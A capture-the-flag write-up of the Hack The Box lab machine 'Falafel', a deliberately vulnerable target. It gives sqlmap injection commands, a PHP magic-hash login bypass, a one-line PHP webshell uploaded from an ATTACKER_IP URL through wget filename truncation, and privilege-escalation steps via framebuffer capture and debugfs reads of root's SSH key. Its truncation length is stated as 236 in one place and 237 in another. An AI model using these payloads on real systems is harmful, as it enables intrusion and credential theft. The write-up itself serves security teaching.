# HTB: Falafel — Writeup

**Difficulty:** Hard | **OS:** Linux | **IP:** 10.10.10.73

## Summary

Falafel chains a blind SQL injection to enumerate users, PHP loose comparison
(type juggling) to bypass authentication with a magic hash, a wget filename
truncation bug to upload a PHP webshell, then abuses Linux group membership
(`video` for framebuffer capture, `disk` for raw block device access via debugfs)
to escalate from `moshe` to `yossi` to `root`.

---

## Enumeration

```bash
nmap -sV -sC -oA nmap/falafel 10.10.10.73
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

```bash
gobuster dir -x php -u http://10.10.10.73 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Key finds: `/login.php`, `/upload.php`, `/uploads/`, `/cyberlaw.txt`

`cyberlaw.txt` hints at two users: `admin` and `chris`.

---

## Foothold

### Boolean-Based Blind SQL Injection

The login form returns distinct messages:
- Invalid username → `"Try again"`
- Valid username, wrong password → `"Wrong identification : <user>"`

This leaks user existence. Automate with sqlmap:

```bash
sqlmap -u http://10.10.10.73/login.php --forms \
  --level 5 --risk 3 \
  --string "Wrong identification" --dump --batch
```

Results from `falafel.users`:

| User | Hash |
|------|------|
| admin | `0e462096931906507119562988736854` |
| chris | `d4ee02a22fc872e36d9e3751ba72ddc8` |

### PHP Type Juggling — Magic Hash

The backend compares hashes using loose equality (`==`):

```php
if ($hash == md5($password)) { ... }  // vulnerable
```

PHP interprets strings starting with `0e` followed by digits as scientific
notation (i.e., zero). Any password whose MD5 also starts with `0e[digits]`
will match.

Admin hash: `0e462096931906507119562988736854`

**Magic payload:** `240610708`

```
md5("240610708") = 0e462097431906509019562988736854
PHP: 0e... == 0e...  →  0 == 0  →  TRUE
```

Logged in as `admin`.

### File Upload Bypass — wget Filename Truncation

The upload feature fetches files via `wget`. `wget` truncates filenames at 236
characters. The server validates only the last extension.

Craft a URL whose filename is 236 characters ending in `.php.png`:

```
http://ATTACKER_IP/[232 x A].php.png
```

Server validates `.png` (passes). `wget` saves as `[232 x A].php` (truncated).

PHP webshell content:

```php
<?php system($_GET['cmd']); ?>
```

Access: `http://10.10.10.73/uploads/AAA...AAA.php?cmd=id`

---

## Privilege Escalation — www-data → moshe

Database credentials in `/var/www/html/connection.php`:

```php
$db_user = "moshe";
$db_pass = "falafelIsReallyTasty";
```

```bash
ssh moshe@10.10.10.73
cat /home/moshe/user.txt
```

**User flag captured.**

---

## Privilege Escalation — moshe → yossi (video group)

```bash
id
# groups: video, adm, mail, audio ...
```

`moshe` is in the `video` group — read access to `/dev/fb0` (framebuffer).

```bash
cp /dev/fb0 /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
# 1176x885
```

Convert on the attacker machine:

```bash
ffmpeg -pix_fmt 0rgb -s 1176x885 -f rawvideo -i screen.raw screen.jpg
```

The screenshot shows `yossi`'s active terminal session with the password visible:
`MoshePlzStopHackingMe!`

```bash
ssh yossi@10.10.10.73
```

---

## Privilege Escalation — yossi → root (disk group)

```bash
id
# groups: disk, adm ...
```

`disk` group allows direct read access to the block device `/dev/sda1`.

```bash
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```

Copy the private key locally:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.10.10.73
cat /root/root.txt
```

**Root flag captured.**

---

## Attack Chain

```
HTTP enum → cyberlaw.txt → users: admin, chris
  → Boolean SQLi (sqlmap) → dump hashes
  → PHP type juggling → 240610708 = magic hash → admin login
  → Upload via wget → filename truncation (237 chars) → .php webshell
  → connection.php → moshe:falafelIsReallyTasty → SSH
  → video group → /dev/fb0 → framebuffer screenshot → yossi password
  → disk group → debugfs /dev/sda1 → root SSH private key
  → root.txt
```

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Service enumeration |
| gobuster | Directory/file discovery |
| sqlmap | Automated SQL injection |
| wget | Filename truncation (built-in) |
| ffmpeg | Framebuffer raw image conversion |
| debugfs | Raw block device filesystem access |
| ssh | Lateral movement and root access |
